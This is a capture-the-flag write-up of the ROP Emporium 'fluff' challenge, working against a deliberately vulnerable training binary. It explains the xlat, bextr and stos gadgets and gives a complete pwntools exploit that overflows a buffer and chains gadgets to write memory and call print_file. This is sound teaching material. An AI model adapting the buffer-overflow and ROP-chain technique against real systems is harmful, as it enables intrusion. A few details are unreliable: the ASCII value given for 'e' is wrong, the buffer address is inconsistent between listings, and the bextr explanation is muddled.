---
title: "ROP Emporium x86-64 Challenge 6: fluff"
date: "2025-12-26"
description: "Writeup for the Roulette fluff challenge of the x86-64 ROP Emporium challenges."
---

# ROP Emporium x86-64 Challenge 6: fluff

#### December 26, 2025

Brace yourself for this one; although conceptually this challenge is nothing new, we'll have to get creative.

The description tells us that this challenge is not very different from the [write4] challenge. We just need to call the `print_file` function in the binary with `flag.txt` as the argument. With all of this said, let's just jump right into it.

Let's start just like we've done until now, checking the functions in the binary:

```
pwndbg> info functions
0x00000000004004d0  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  print_file@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400628  questionableGadgets
0x0000000000400640  __libc_csu_init
0x00000000004006b0  __libc_csu_fini
0x00000000004006b4  _fini
```

Exactly the same as the write4 challenge, except from one function: `questionableGadgets`. Well, let's rip the band aid right off and disassemble it.

```
pwndbg> disas questionableGadgets
   0x0000000000400628 <+0>:	    xlat   BYTE PTR ds:[rbx]
   0x0000000000400629 <+1>:	    ret
   0x000000000040062a <+2>:	    pop    rdx
   0x000000000040062b <+3>:	    pop    rcx
   0x000000000040062c <+4>:	    add    rcx,0x3ef2
   0x0000000000400633 <+11>:	bextr  rbx,rcx,rdx
   0x0000000000400638 <+16>:	ret
   0x0000000000400639 <+17>:	stos   BYTE PTR es:[rdi],al
   0x000000000040063a <+18>:	ret
   0x000000000040063b <+19>:	nop    DWORD PTR [rax+rax*1+0x0]

```

Right.

We have three gadgets here (one for each `ret` function). Don't worry, it's perfectly normal to not understand a single gadget in here. Let's go through each one of them carefully.

## The `xlat` gadget

```
xlat    BYTE PTR ds:[rbx]
ret
```

`xlat` is an instruction that involves two registers: `al` and `rbx`. The value of `rbx` should be a pointer to an array in memory (in theory it should be a table, but for what we'll use it to, we might as well call it an array). The value of `al` should be an index in that array.

What `xlat` does is replace the value of `al` to the byte stored in whatever index of the array was stored in `al` before the instruction. Let's see an example.

```
0xAEAE: 'h'  0xAEAF: 'e' 0xAEB0: 'y'  0xAEB1: '\0'

BEFORE XLAT:
RBX: 0xAEAE (Points to the first element of the array)
AL: 1

AFTER XLAT:
RBX: 0xAEAE
AL: 65 ('e' in ASCII, the character in index 1 of the array)
```

We have an array with the elements `['h', 'e', 'y', '\0']` in it, `rbx` pointing to the beginning of that array and `al` with `1` stored in it. When `xlat` is executed, the value of `al` will change to whatever value its index was pointing to. In this case, it was pointing to the index `1`, so its value will now be 65, which represents the letter 'e' in ASCII.

## The `bextr` gadget
This one is the most obscure gadget of the three. It works with three registers: `rbx`, `rcx` and `rdx`.

`bextr` performs an extraction. It reads a source value, stored in `rcx`, and with some control bits in `rdx` (we'll see later), it will copy a chunk of the bits into `rbx`. Let's see an example:

```
RCX: 1100 0100 1110 1010 (source)
RDX: 0x0804 (Start at bit 4 and extract 8 bits)
RBX: 0100 1110
```

The only important bytes in `rdx` are the first four. The first two declare the starting bit and the next two declare the amount of bits that will be copied into `rbx`.

To make matters worse, this gadget also executes an `add` instruction before `bextr`:

```
   0x000000000040062a <+2>:	pop    rdx
   0x000000000040062b <+3>:	pop    rcx
   0x000000000040062c <+4>:	add    rcx,0x3ef2
   0x0000000000400633 <+11>:	bextr  rbx,rcx,rdx
```

We'll have to work around that somehow. At least the gadget allows us to pop values into the registers the instruction uses.
## The `stos` gadget

`stos` is actually very simple to understand, and very useful for this challenge. In simple terms, it just stores the byte stored in `AL` in the address in memory specified in `rdi`. It also modifies `rdi` according to a program flag value, but we don't need to worry about that. Here's an example:

```
0xAEAE: 0x2341

AL: 61
RDI: 0xAEAE

After executing stos:
OxAEAE: 61
```

## The strategy
With these gadgets, there is a way to arbitrarily store data in memory. This is useful because we want to have a string in memory we can use as an argument for `print_file`. In other words, we can write `flag.txt` in memory with these gadgets. But the strategy is everything but intuitive.

With the `bextr` gadget, we can store an arbitrary value in `rbx`. This is good, because the `xlat` instruction uses the `rbx` register as a pointer.

Considering the fact that we have full control of what can be stored in `rbx`, we can point to anywhere in memory if we want to, which in theory allows us to store any value we want in `al`. There's a caveat with this though, but let's go one issue at a time. Having control of  `al` is useful too, because `stos` will store whatever byte is stored in `al` in memory (assuming we can also control `rdi` with another gadget. Spoiler: we can).

To sum up, arbitrary writing in memory *is* possible with these gadgets. But the way in which this is achieved is very difficult to visualize. I'll try my best to explain the loop needed for the exploit:

1. We write `flag.txt` in the garbage section of the buffer overflow (the place in which in previous challenges we've written 'A's to reach the return address offset).
2. Using `bextr`, we write in `rbx` the address of the section in which `flag.txt` is (with an adjustment to make sure `xlat` takes the proper byte, we'll see later).
3. With the adjusted pointer in `rbx`, we execute the `xlat` gadget to store one byte of `flag.txt`. This adjustment is needed because the index that `xlat` will take is stored in `al` too. We have no direct way of controlling what value is in this register before getting here, so for each byte we take, we'll have to calculate an offset for `rbx`.
4. Once we have the byte we want stored in `al`, we can store it somewhere else with `stos`. Usually we do this in the `bss` section of the binary.
5. We do this in loop until we write the last "t" of "flag.txt". After that, we can use a `pop rdi; ret` gadget to then execute `print_file` and read the flag.

That was a handful... It took a lot of pondering to get this right. Before we get to the exploit building, let's talk about the offset I mentioned in step 2 and 3.

## The `rbx` offset
There are a few issues with making sure that the proper pointer is stored in `rbx`. Remember the `add` instruction in the `bextr` gadget?

```
   0x000000000040062a <+2>:	    pop    rdx
   0x000000000040062b <+3>:	    pop    rcx
   0x000000000040062c <+4>:	    add    rcx,0x3ef2
   0x0000000000400633 <+11>:	bextr  rbx,rcx,rdx
```

Whatever value we store in `rcx`, `0x3ef2` will be added to it. We have to take this into account:

```
rbx_offset = -0x3ef2
```

Then, as I've mentioned, this strategy is operated in a loop, for every character `flag.txt` has. This means that for every character we go through, we'll have to increment by one the starting address of the `flag.txt` pointer:

```
rbx_offset = -0x3ef2 + i
```

And now, the cherry on top. Since the value stored in the register `al` after executing `xlat` depends on `al` as well, and also considering the fact that there is no other way for us to arbitrarily modify `al` with any other gadget, we will have to take into account the value of `al` *before* we perform our exploit. This can easily be checked with a breakpoint right before the `ret` instruction of the `pwnme` function. It turns out that the value of `al` is `11`, so we'll have to subtract `11` from the pointer, because `al` will go into the index `11` from the starting point of the array pointer. Which means that, for example, if the byte we want to store in `al` is in the index 0 of the array `0xAEAE`, the pointer in `rbx` should be `0xAEAE - 11`.

```
rbx_offset = -0x3ef2 + i - 11
```

But there's more! We have to consider the next iterations! Once we store in `al` the first byte of `flag.txt`  (the character `f`, 102 in ASCII), we'll have to subtract `102` from the offset, not `11`. And we'll have to consider the next iterations as well! Let's take this into account in code:

```
FLAG_TEXT = "flag.txt"
al_offset = 11 # Initial value of al

rbx_offset = -0x3ef2 + i - al_offset
al_offset = ord(FLAG_TEXT[i]) # Gets the ASCII value of the character
```

Pwning is hard.

At least that's the climax in terms of understanding the strategy. With this in mind, we can begin building the payload.

## The payload
Like we always do, let's begin with defining some variables:

```
from pwn import *

OFFSET = 40
OVERFLOWED_BUFFER_ADDRESS = 0x7fffffffdc30

BEXTR_GADGET_ADDRESS = 0x0000040062A
XLAT_GADGET_ADDRESS = 0x0000000400628
STOS_GADGET_ADDRESS = 0x0000000000400639
POP_RDI_GADGET_ADDRESS = 0x004006a3
PRINT_FILE_FUNCTION_ADDRESS = 0x400510
BSS_ADDRESS = 0x0000000000601038

FLAG_TEXT = "flag.txt"
al_offset = 11
```

The offset was obtained the same way as in the other challenges. The pointer to the overflowed buffer (the buffer that we overflow in `pwnme`) was obtained by adding a breakpoint in the `read` function in `pwnme`. Once you stop in there, pwndbg prints out in which pointer will `read` write your input. That's the buffer.  The `bss` pointer was obtained with `info files`. The `bss` area is one in which we have write permissions. Perfect to store arbitrary values in. 

With the variables out of the way, let's assemble our `payload` variable.

First, we set up the offset. As we've said, we'll write `flag.txt` in it, and then as many A's as we need to get to the return address, just like we've done in the other challenges:

```
payload = b"flag.txt" + b"A"*(OFFSET - 8) # 8 = length of flag.txt
```

Now we can start the loop. Since `flag.txt` has 8 characters, and we can copy one character to memory at a time, we'll have to execute this loop eight times. The first thing we'll do in every iteration is calculate the `rbx` offset:

```
for i in range(8):
	rbx_offset = -0x3ef2 + i - al_offset
```

Now we need to run the `bextr` gadget. In `rdx`, the control register, we'll set the starting address to `0x00` and the length of the extraction to `0xFF`, meaning that we'll copy the whole register into `rbx`. In `rcx`, we'll push `OVERFLOWED_BUFFER_ADDRESS + rbx_offset`, so it can be copied into `rbx`:  

```
for i in range(8):
	rbx_offset = -0x3ef2 + i - al_offset
	payload += p64(BEXTR_GADGET_ADDRESS)
	payload += p64(0xFF00) # rdx
	payload += p64(OVERFLOWED_BUFFER_ADDRESS + rbx_offset)
```

This will write in `rbx` our adjusted pointer, ready for `xlat` to read into it:

```
for i in range(8):
	rbx_offset = -0x3ef2 + i - al_offset
	payload += p64(BEXTR_GADGET_ADDRESS)
	payload += p64(0xFF00) # rdx
	payload += p64(OVERFLOWED_BUFFER_ADDRESS + rbx_offset) # rcx
	payload += p64(XLAT_GADGET_ADDRESS)
```

After this, `al` will contain whatever character of `flag.txt` the iteration is on. All we need to do is store it in `bss`, with the `pop rdi; ret` gadget I've found with the `rop` command and the `stos` gadget:

```
for i in range(8):
	rbx_offset = -0x3ef2 + i - al_offset
	payload += p64(BEXTR_GADGET_ADDRESS)
	payload += p64(0xFF00) # rdx
	payload += p64(OVERFLOWED_BUFFER_ADDRESS + rbx_offset) # rcx
	
	payload += p64(XLAT_GADGET_ADDRESS)
	payload += p64(POP_RDI_GADGET_ADDRESS)
	payload += p64(BSS_ADDRESS + i) # rdi
	payload += p64(STOS_GADGET_ADDRESS)
```

We add `i` to it because we don't want to keep overwriting the same byte in `bss`.

After `stos`, all we need to do is update `al_offset`:

```
for i in range(8):
	rbx_offset = -0x3ef2 + i - al_offset
	payload += p64(BEXTR_GADGET_ADDRESS)
	payload += p64(0xFF00) # rdx
	payload += p64(OVERFLOWED_BUFFER_ADDRESS + rbx_offset) # rcx
	
	payload += p64(XLAT_GADGET_ADDRESS)
	payload += p64(POP_RDI_GADGET_ADDRESS)
	payload += p64(BSS_ADDRESS + i) # rdi
	payload += p64(STOS_GADGET_ADDRESS)
	
	al_offset = ord(FLAG_TEXT[i])
```

The loop is done! When this loop ends, the `flag.txt` string will be written into `bss`. All we need to do now is call `print_file` with the pointer to `flag.txt` as an argument. This can be done with the `pop rdi; ret` gadget too:

```
payload += p64(POP_RDI_GADGET_ADDRESS)
payload += p64(BSS_ADDRESS) # rdi
payload += p64(PRINT_FILE_FUNCTION_ADDRESS)
```

The payload is done! Now we just write it into a file to use is as input, and the script is done! Here's the whole thing:

```
from pwn import *

OFFSET = 40
OVERFLOWED_BUFFER_ADDRESS = 0x7fffffffdc10

BEXTR_GADGET_ADDRESS = 0x0000040062A
XLAT_GADGET_ADDRESS = 0x0000000400628
STOS_GADGET_ADDRESS = 0x0000000000400639
POP_RDI_GADGET_ADDRESS = 0x004006a3
PRINT_FILE_FUNCTION_ADDRESS = 0x400510
BSS_ADDRESS = 0x0000000000601038

FLAG_TEXT = "flag.txt"
al_offset = 11


payload  = b"flag.txt" + b"A"*(OFFSET - 8) # 8 = length of flag.txt
for i in range(8):
	rbx_offset = -0x3ef2 + i - al_offset
	payload += p64(BEXTR_GADGET_ADDRESS)
	payload += p64(0xFF00) # rdx
	payload += p64(OVERFLOWED_BUFFER_ADDRESS + rbx_offset) # rcx
	
	payload += p64(XLAT_GADGET_ADDRESS)
	payload += p64(POP_RDI_GADGET_ADDRESS)
	payload += p64(BSS_ADDRESS + i) # rdi
	payload += p64(STOS_GADGET_ADDRESS)
	
	al_offset = ord(FLAG_TEXT[i])

payload += p64(POP_RDI_GADGET_ADDRESS)
payload += p64(BSS_ADDRESS) # rdi
payload += p64(PRINT_FILE_FUNCTION_ADDRESS)

open("exploit", "bw").write(payload)
```

This solution, if executed normally, will throw a segmentation fault before printing the flag. However, if we execute it inside pwndbg, we'll be able to read the file before it segfaults. With this said, let's run the exploit:

```
$ python3 exploit.py
$ pwndbg fluff
pwndbg> run < exploit
fluff by ROP Emporium
x86_64

You know changing these strings means I have to rewrite my solutions...
> Thank you!
ROPE{a_placeholder_32byte_flag!}

Program received signal SIGSEGV, Segmentation fault.
```

## A few (very interesting!) things

The fact that this solution works is nothing short of a miracle, and I mean this. First, this payload doesn't need stack aligning to work, which is already a feat by itself. Second, and most importantly, this payload is **exactly** as big as the number of bytes that the `read` function in `pwnme` reads. This means that if you add just one more address to the payload, it won't be read by `read` and it will not show up in the overflowed buffer, rendering that address, gadget or pointer completely useless.

I found out this the hard way, when after figuring out the trick and building the payload, I realized that the last two addresses I added into the buffer just weren't there when I ran the binary. I was ready to give up (by that time I had already spent a few hours with the challenge) when, to my amazement, removing the two stack alignments I coded in the payload gave me no issues, other than probably that fact that that's why the program segfaults at the end. That sure was a roller-coaster of emotions.

On another note, you might have noticed something fishy. In the beginning of the exploit, when we write in the characters to reach the return address offset, I write `flag.txt` in there. Well, isn't that writing in memory already? Why do you need to build that shoddy payload just to write `flag.txt` again but in `bss`? That's exactly what I asked myself much before I came up with the solution I present in this writeup. 

That's right, you can just write `flag.txt` in the buffer (plus a null character as a delimiter), then all the other garbage characters until the return address and then the `pop rdi; ret` gadget along with the address to the buffer to then call `print_file` to print the flag. It's a perfectly possible solution. However, had you stopped there and not come up with the complicated solution, you wouldn't have learnt as much, right?

Actually, there are ways in which you can read the flag without even having to write any special string in the buffer overflow. [This writeup does it](https://github.com/shero4/ROP-Emporium-2020-writeup/blob/master/fluff/exploit.py), it's a very smart solution that I really like. This approach is more solid than mine, and it probably works better under more strict environments. I could've written that solution in this writeup, but I didn't want to. In the end, this is the solution I came up with. It took me a lot of work, and honestly, I'm quite proud of it! The fact that it barely works, and that it's pretty much a miracle that it does, makes me feel like it's worth sharing (and that it's pretty funny), because it goes to show that when it comes down to capturing flags, any solution within the rules is valid, no matter how cluttery, weird or inconsistent. Pwning can be very difficult and unintuitive, and each person has their own ways of going around the pond!
